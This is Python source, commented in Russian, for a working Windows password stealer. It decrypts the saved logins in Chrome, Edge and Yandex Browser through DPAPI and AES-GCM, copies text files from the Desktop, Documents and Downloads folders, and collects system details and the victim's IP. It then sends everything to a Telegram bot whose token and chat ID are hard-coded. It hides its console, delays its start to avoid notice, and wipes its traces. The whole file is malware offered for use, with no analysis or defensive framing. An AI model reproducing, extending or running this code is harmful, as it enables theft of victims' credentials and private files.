import os
import json
import sqlite3
import shutil
import requests
import logging
import win32crypt
import tempfile
import zipfile
import platform
import sys
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64decode

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "7257475701:AAHZO7eERlnpFzZAeiRYDZpXssAIoCPkJZs"
CHAT_ID = "1602957963"
DEBUG_MODE = True
MAX_FILE_SIZE = 44 * 1024 * 1024  # 44MB
# =====================

# Настройка логирования
log_file = os.path.join(tempfile.gettempdir(), 'stealer_debug.log')
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def internet_available():
    """Проверка доступности интернета"""
    try:
        requests.get("https://google.com", timeout=10)
        return True
    except:
        return False

def send_telegram(file_path=None, text=None, part_number=None):
    """Улучшенная функция отправки в Telegram"""
    try:
        if not internet_available():
            logging.error("Internet not available")
            return False
            
        if file_path:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                # Добавляем порядковый номер к имени файла
                original_name = os.path.basename(file_path)
                if part_number is not None:
                    file_name = f"{part_number}_{original_name}"
                else:
                    file_name = original_name
                    
                files = {'document': (file_name, f)}
                data = {'chat_id': CHAT_ID}
                response = requests.post(url, data=data, files=files, timeout=120)
                logging.info(f"Telegram file response: {response.status_code}")
                if response.status_code != 200:
                    logging.error(f"Telegram error: {response.text}")
                return response.status_code == 200
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': CHAT_ID,
                'text': text
            }
            response = requests.post(url, data=data, timeout=15)
            logging.info(f"Telegram message response: {response.status_code}")
            if response.status_code != 200:
                logging.error(f"Telegram error: {response.text}")
            return response.status_code == 200
    except Exception as e:
        logging.error(f"Telegram send error: {str(e)}")
        return False

def get_encryption_key(browser_path):
    """Получаем ключ шифрования из Local State"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            logging.warning(f"Local State not found: {local_state_path}")
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Удаляем префикс DPAPI
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        logging.info(f"Key extracted for {browser_path}")
        return key
    except Exception as e:
        logging.error(f"Key extraction error: {str(e)}")
        return None

def decrypt_password(ciphertext, key):
    """Дешифруем пароль с использованием ключа"""
    try:
        if not key or not ciphertext:
            return ""
            
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        tag = ciphertext[-16:]
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
        return decrypted_password.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption error: {str(e)}")
        return ""

def get_all_passwords():
    """Собираем пароли из всех профилей браузеров (Chrome/Edge/Yandex)"""
    data = []
    browsers = {
        'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        'Yandex': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data')
    }

    for name, path in browsers.items():
        try:
            if not os.path.exists(path):
                logging.warning(f"Browser path not found: {path}")
                continue
                
            key = get_encryption_key(path)
            if not key:
                logging.error(f"No encryption key for {name}")
                continue
                
            # Ищем ВСЕ профили
            profiles = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d)) and (d.startswith("Profile") or d == "Default" or d == "User Data")]
            
            # Особенность Yandex: профили могут быть в папке "User Data"
            if name == 'Yandex' and 'User Data' in profiles:
                yandex_profiles_path = os.path.join(path, 'User Data')
                if os.path.exists(yandex_profiles_path):
                    profiles.extend([os.path.join('User Data', d) for d in os.listdir(yandex_profiles_path) 
                                    if os.path.isdir(os.path.join(yandex_profiles_path, d)) and (d.startswith("Profile") or d == "Default")])
            
            for profile in profiles:
                login_db = os.path.join(path, profile, 'Login Data')
                if not os.path.exists(login_db):
                    # Для Yandex пробуем альтернативный путь
                    if name == 'Yandex':
                        login_db = os.path.join(path, profile, 'Ya Passman Data')
                    if not os.path.exists(login_db):
                        continue
                    
                logging.info(f"Processing {name} profile: {profile}")
                
                # Копируем и читаем базу
                temp_db_path = os.path.join(tempfile.gettempdir(), f"{name}_{profile}_temp_db")
                shutil.copy2(login_db, temp_db_path)
                
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                
                # Проверяем доступные таблицы
                tables = cursor.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
                table_names = [t[0] for t in tables]
                
                # Пробуем разные варианты таблиц
                target_table = None
                for table in ['logins', 'password_entries', 'passwords']:
                    if table in table_names:
                        target_table = table
                        break
                
                if target_table:
                    # Определяем структуру таблицы
                    columns = [col[1] for col in cursor.execute(f"PRAGMA table_info({target_table})").fetchall()]
                    
                    # Маппинг возможных имен столбцов
                    url_col = next((col for col in columns if 'url' in col.lower() or 'origin' in col.lower()), None)
                    user_col = next((col for col in columns if 'user' in col.lower() or 'login' in col.lower()), None)
                    pass_col = next((col for col in columns if 'pass' in col.lower() or 'value' in col.lower()), None)
                    
                    if url_col and user_col and pass_col:
                        cursor.execute(f"SELECT {url_col}, {user_col}, {pass_col} FROM {target_table}")
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            if not encrypted_password:
                                continue
                            password = decrypt_password(encrypted_password, key)
                            if url and username and password:
                                data.append({
                                    'browser': f"{name} ({profile})",
                                    'url': url,
                                    'username': username,
                                    'password': password
                                })
                cursor.close()
                conn.close()
                if os.path.exists(temp_db_path):
                    os.unlink(temp_db_path)
                
        except Exception as e:
            logging.error(f"Error in {name}: {str(e)}")
    
    return json.dumps(data, indent=2) if data else "{}"

def collect_txt_files():
    """Собираем все TXT файлы с рабочего стола"""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
    downloads = os.path.join(os.environ['USERPROFILE'], 'Downloads')
    
    locations = [desktop, documents, downloads]
    txt_files = []
    
    for location in locations:
        if os.path.exists(location):
            for root, _, files in os.walk(location):
                for file in files:
                    if file.lower().endswith('.txt'):
                        full_path = os.path.join(root, file)
                        # Пропускаем слишком большие файлы (>1MB)
                        try:
                            if os.path.getsize(full_path) < 1024 * 1024:
                                txt_files.append(full_path)
                        except:
                            continue
    
    logging.info(f"Found {len(txt_files)} TXT files")
    return txt_files

def get_site_info(sites):
    """Получаем информацию о сайтах"""
    site_data = []
    
    for site in sites:
        try:
            # Пробуем HTTPS
            try:
                response = requests.get(f"https://{site}", timeout=10)
                protocol = "https"
            except:
                # Пробуем HTTP если HTTPS не работает
                try:
                    response = requests.get(f"http://{site}", timeout=10)
                    protocol = "http"
                except Exception as e:
                    site_data.append({
                        'site': site,
                        'error': f"Both HTTPS and HTTP failed: {str(e)}"
                    })
                    continue
            
            site_data.append({
                'site': site,
                'protocol': protocol,
                'status': response.status_code,
                'headers': dict(response.headers),
                'content_sample': response.text[:500] if response.text else ""
            })
        except Exception as e:
            site_data.append({
                'site': site,
                'error': str(e)
            })
    
    logging.info(f"Collected data for {len(site_data)} sites")
    return json.dumps(site_data, indent=2)

def create_zip_archive(source_dir, zip_path):
    """Надежная функция создания ZIP-архива"""
    try:
        # Создаем архив напрямую, без временного файла
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=3) as zipf:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.exists(file_path):
                        # Сохраняем относительный путь
                        arcname = os.path.relpath(file_path, source_dir)
                        
                        # Добавляем файл в архив
                        try:
                            zipf.write(file_path, arcname)
                            logging.debug(f"Added to ZIP: {file_path} as {arcname}")
                        except Exception as e:
                            logging.error(f"Error adding file to ZIP: {file_path} - {str(e)}")
                    else:
                        logging.warning(f"File not found: {file_path}")
        
        # Проверяем целостность архива
        try:
            with zipfile.ZipFile(zip_path, 'r') as test_zip:
                bad_file = test_zip.testzip()
                if bad_file:
                    logging.error(f"Archive integrity check failed on file: {bad_file}")
                    return 0
        except Exception as e:
            logging.error(f"Archive integrity check error: {str(e)}")
            return 0
        
        size = os.path.getsize(zip_path)
        logging.info(f"Created ZIP archive: {zip_path} ({size} bytes)")
        return size
    except Exception as e:
        logging.error(f"Error creating ZIP archive: {str(e)}")
        return 0

def get_system_info():
    """Собираем системную информацию для диагностики"""
    try:
        info = {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.getlogin(),
            "hostname": platform.node(),
            "python_version": sys.version,
            "python_executable": sys.executable,
            "ip_address": requests.get('https://api.ipify.org').text if internet_available() else "N/A"
        }
        return json.dumps(info, indent=2)
    except Exception as e:
        return f"Error getting system info: {str(e)}"

def split_file(file_path, max_size):
    """Делит файл на части указанного размера"""
    part_files = []
    part_num = 1
    try:
        file_size = os.path.getsize(file_path)
        if file_size <= max_size:
            return [file_path]
        
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(max_size)
                if not chunk:
                    break
                
                # Формируем имя части с порядковым номером
                base_name = os.path.basename(file_path)
                part_name = os.path.join(
                    os.path.dirname(file_path),
                    f"{part_num}_{base_name}"
                )
                
                with open(part_name, 'wb') as part_file:
                    part_file.write(chunk)
                part_files.append(part_name)
                part_num += 1
        return part_files
    except Exception as e:
        logging.error(f"File split error: {str(e)}")
        return []

def send_large_file(file_path):
    """Отправляет большой файл частями через Telegram"""
    try:
        file_size = os.path.getsize(file_path)
        if file_size <= MAX_FILE_SIZE:
            return send_telegram(file_path=file_path)
        
        parts = split_file(file_path, MAX_FILE_SIZE)
        if not parts:
            return False
        
        total_parts = len(parts)
        send_telegram(text=f"📦 Файл слишком большой ({file_size//1024//1024}MB). Отправляю частями: {total_parts} шт.")
        
        for i, part in enumerate(parts):
            # Повторные попытки отправки
            success = False
            for attempt in range(3):
                try:
                    if send_telegram(file_path=part, part_number=i+1):
                        logging.info(f"Sent part {i+1}/{total_parts}")
                        success = True
                        break
                    else:
                        logging.warning(f"Attempt {attempt+1} failed for part {i+1}")
                        time.sleep(5)
                except Exception as e:
                    logging.error(f"Error sending part {i+1}: {str(e)}")
                    time.sleep(10)
            
            # Удаляем часть после отправки
            try:
                os.unlink(part)
            except:
                pass
            
            if not success:
                logging.error(f"Failed to send part {i+1}/{total_parts} after 3 attempts")
                return False
            
            time.sleep(3)  # Задержка между отправками
        
        return True
    except Exception as e:
        logging.error(f"Large file send error: {str(e)}")
        return False

def main():
    """Основная функция сбора и отправки данных"""
    try:
        # Создаем временную папку
        temp_dir = tempfile.mkdtemp()
        logging.info(f"Temp directory created: {temp_dir}")
        
        # Проверка интернета
        if not internet_available():
            logging.error("No internet connection - cannot send data")
            if DEBUG_MODE:
                with open(os.path.join(temp_dir, 'no_internet.txt'), 'w') as f:
                    f.write("Internet not available")
            return
        
        # Сбор данных
        passwords_data = get_all_passwords()
        txt_files = collect_txt_files()
        site_info = get_site_info(["funpay.com", "playerok.com", "github.com"])
        system_info = get_system_info()
        
        # Сохраняем данные в файлы
        with open(os.path.join(temp_dir, 'passwords.json'), 'w', encoding='utf-8') as f:
            f.write(passwords_data)
        
        with open(os.path.join(temp_dir, 'sites_info.json'), 'w', encoding='utf-8') as f:
            f.write(site_info)
            
        with open(os.path.join(temp_dir, 'system_info.json'), 'w', encoding='utf-8') as f:
            f.write(system_info)
        
        # Копируем TXT файлы (если они есть и не слишком большие)
        if txt_files:
            txt_dir = os.path.join(temp_dir, 'txt_files')
            os.makedirs(txt_dir, exist_ok=True)
            for file_path in txt_files:
                try:
                    # Проверяем размер файла перед копированием
                    if os.path.getsize(file_path) < 5 * 1024 * 1024:  # 5MB
                        shutil.copy(file_path, txt_dir)
                    else:
                        logging.warning(f"Skipping large TXT file: {file_path}")
                except Exception as e:
                    logging.error(f"File copy error: {file_path} - {str(e)}")
        
        # Создаем ZIP архив
        zip_path = os.path.join(tempfile.gettempdir(), 'stolen_data.zip')
        zip_size = create_zip_archive(temp_dir, zip_path)
        
        # Отправка в Telegram
        if not os.path.exists(zip_path) or zip_size == 0:
            logging.error("ZIP file not created or empty")
            send_telegram(text="Ошибка: Не удалось создать ZIP архив с данными")
        else:
            if send_large_file(zip_path):
                send_telegram(text=f"✅ Данные собраны с {os.environ.get('COMPUTERNAME', 'unknown')}")
            else:
                logging.error("Failed to send ZIP via Telegram")
                send_telegram(text="❌ Ошибка отправки данных")
        
        # Отправка лога при ошибках
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            error_count = 0
            with open(log_file, 'r') as f:
                content = f.read()
                error_count = content.count("ERROR") + content.count("WARNING")
                
            if error_count > 0 or DEBUG_MODE:
                # Отправляем лог как файл
                send_telegram(file_path=log_file, text=f"Лог работы ({error_count} ошибок)")
        
        # Очистка
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
            if os.path.exists(zip_path):
                os.unlink(zip_path)
            if os.path.exists(log_file):
                os.unlink(log_file)
        except:
            pass
            
    except Exception as e:
        logging.exception("Critical error in main")
        try:
            error_msg = f"КРИТИЧЕСКАЯ ОШИБКА: {str(e)}"
            send_telegram(text=error_msg)
            if os.path.exists(log_file):
                send_telegram(file_path=log_file, text="Полный лог ошибки:")
        except:
            pass

if __name__ == "__main__":
    # Скрытый режим запуска (без консоли)
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Задержка перед запуском для маскировки
    time.sleep(30)
    
    main()